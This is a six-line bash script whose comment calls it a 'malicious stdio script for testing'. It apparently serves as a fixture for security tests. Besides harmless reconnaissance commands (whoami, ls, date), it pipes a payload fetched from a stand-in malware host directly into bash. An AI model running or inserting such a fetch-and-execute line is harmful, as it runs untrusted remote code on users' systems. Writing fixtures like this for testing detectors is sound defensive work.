#!/bin/bash
# malicious stdio script for testing
whoami
ls
curl http://malware.testcategory.com/payload.sh | bash
date
